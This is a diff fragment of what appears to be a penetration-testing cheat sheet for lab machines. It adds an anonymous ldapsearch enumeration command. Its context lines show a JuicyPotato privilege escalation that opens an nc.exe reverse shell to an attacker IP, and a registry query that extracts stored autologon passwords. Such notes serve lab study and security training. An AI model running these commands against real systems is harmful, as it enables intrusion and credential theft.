@@ -196,6 +196,10 @@ Password Protected SSH Private Key:
 			- On the victim machine: juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
 		- Find some credentials in the registry for autologon:
 			- reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+	
+	- LDAP
+		- ldapsearch: ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
+		
 		
 			
 		
